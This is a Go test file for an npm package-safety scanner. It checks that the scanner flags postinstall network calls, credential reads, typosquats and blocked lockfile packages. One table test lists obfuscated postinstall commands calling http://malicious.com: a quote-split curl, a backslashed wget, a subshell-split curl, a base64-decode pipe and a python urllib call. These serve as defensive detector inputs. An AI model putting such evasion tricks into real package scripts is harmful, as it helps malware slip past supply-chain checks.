package npm

import (
	"encoding/json"
	"path/filepath"
	"testing"

	"github.com/niyam-ai/pkgsafe/internal/policy"
	"github.com/niyam-ai/pkgsafe/internal/types"
)

func fixture(name string) string {
	return filepath.Join("..", "..", "..", "testdata", "npm", name)
}

func TestSafePackageAllows(t *testing.T) {
	res, err := AnalyzePackageDir(fixture("safe-package"), policy.Default())
	if err != nil {
		t.Fatal(err)
	}
	if res.Decision != types.DecisionAllow {
		t.Fatalf("expected allow, got %s score=%d reasons=%v", res.Decision, res.Score, res.Reasons)
	}
}

func TestPostinstallCurlWarnsOrBlocks(t *testing.T) {
	res, err := AnalyzePackageDir(fixture("postinstall-curl"), policy.Default())
	if err != nil {
		t.Fatal(err)
	}
	if res.Decision == types.DecisionAllow {
		t.Fatalf("expected warn/block, got allow: %+v", res)
	}
	if res.Score < 30 {
		t.Fatalf("expected elevated score, got %d", res.Score)
	}
}

func TestCredentialReadBlocks(t *testing.T) {
	res, err := AnalyzePackageDir(fixture("reads-credentials"), policy.Default())
	if err != nil {
		t.Fatal(err)
	}
	if res.Decision != types.DecisionBlock {
		t.Fatalf("expected block, got %s score=%d reasons=%v", res.Decision, res.Score, res.Reasons)
	}
}

func TestTyposquatWarns(t *testing.T) {
	res, err := AnalyzePackageDir(fixture("typosquat"), policy.Default())
	if err != nil {
		t.Fatal(err)
	}
	if res.Decision == types.DecisionAllow {
		t.Fatalf("expected warn/block for typosquat, got allow")
	}
}

func TestLockfileTyposquat(t *testing.T) {
	res, err := AnalyzeLockfile(filepath.Join("..", "..", "..", "testdata", "npm", "package-lock.json"), policy.Default())
	if err != nil {
		t.Fatal(err)
	}
	if res.Decision == types.DecisionAllow {
		t.Fatalf("expected lockfile warning, got allow")
	}
}

func TestLockfileBlockedPackage(t *testing.T) {
	pol := policy.Default()
	pol.BlockedPackages.NPM = []string{"axios"}
	res, err := AnalyzeLockfile(filepath.Join("..", "..", "..", "testdata", "npm", "package-lock.json"), pol)
	if err != nil {
		t.Fatal(err)
	}
	if res.Decision != types.DecisionBlock {
		t.Fatalf("expected lockfile block for blocked package, got %s", res.Decision)
	}
	found := false
	for _, r := range res.Reasons {
		if r.ID == "blocked_package" && r.Evidence == "axios" {
			found = true
			break
		}
	}
	if !found {
		t.Fatalf("expected blocked_package reason for axios, got reasons: %+v", res.Reasons)
	}
}

func TestStaticDetectionBypasses(t *testing.T) {
	pol := policy.Default()

	tests := []struct {
		name       string
		script     string
		expectedID string
	}{
		{
			name:       "quoted curl",
			script:     "c'u'r'l http://malicious.com",
			expectedID: "network_command_in_lifecycle",
		},
		{
			name:       "backslashed wget",
			script:     "w\\g\\e\\t http://malicious.com",
			expectedID: "network_command_in_lifecycle",
		},
		{
			name:       "subshell curl",
			script:     "c$()url http://malicious.com",
			expectedID: "network_command_in_lifecycle",
		},
		{
			name:       "concatenated curl",
			script:     "cu + rl http://malicious.com",
			expectedID: "network_command_in_lifecycle",
		},
		{
			name:       "long base64 payload",
			script:     "echo aGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQg | base64 -d",
			expectedID: "obfuscated_script",
		},
		{
			name:       "python interpreter call",
			script:     "python -c 'import urllib'",
			expectedID: "obfuscated_script",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			pj := PackageJSON{
				Name:    "test-bypass",
				Version: "1.0.0",
				Scripts: map[string]string{
					"postinstall": tc.script,
				},
			}
			b, err := json.Marshal(pj)
			if err != nil {
				t.Fatal(err)
			}
			res, err := AnalyzePackageJSON(b, pol)
			if err != nil {
				t.Fatal(err)
			}
			found := false
			for _, r := range res.Reasons {
				if r.ID == tc.expectedID {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("expected script %q to flag reason %q, got reasons: %+v", tc.script, tc.expectedID, res.Reasons)
			}
		})
	}
}
